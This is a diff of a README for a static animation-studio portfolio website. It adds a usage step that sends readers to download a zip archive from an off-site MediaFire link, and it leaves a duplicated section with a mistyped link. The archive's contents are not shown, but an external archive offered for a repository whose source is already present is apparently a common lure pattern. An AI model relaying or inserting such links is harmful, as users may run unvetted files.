@@ -6,8 +6,9 @@
 
 This repository contains the source code for the LITI Animation Studio static website, developed using HTML, CSS, and JavaScript.
 
-## Developer
-This website was developed with ❤ by [Developer Anand](https://github.com/DEV-ANAND369).
+## Usage
+To view the website locally:
+1. Download The File From the following Link: [DownloadNow](https://www.mediafire.com/file/sfbjgznrkza0idh/Animation_Studio.zip/file)
 
 ## Overview
 The static website serves as an online portfolio for LITI Animation Studio, showcasing our projects, services, and contact information.
@@ -20,4 +21,7 @@ The static website serves as an online portfolio for LITI Animation Studio, show
 
 ## Usage
 To view the website locally:
-1. Download The File From the following Link:
+1. Download The File From the following Link: [Downloae]
+
+## Developer
+This website was developed with ❤ by [Developer Anand](https://github.com/DEV-ANAND369).
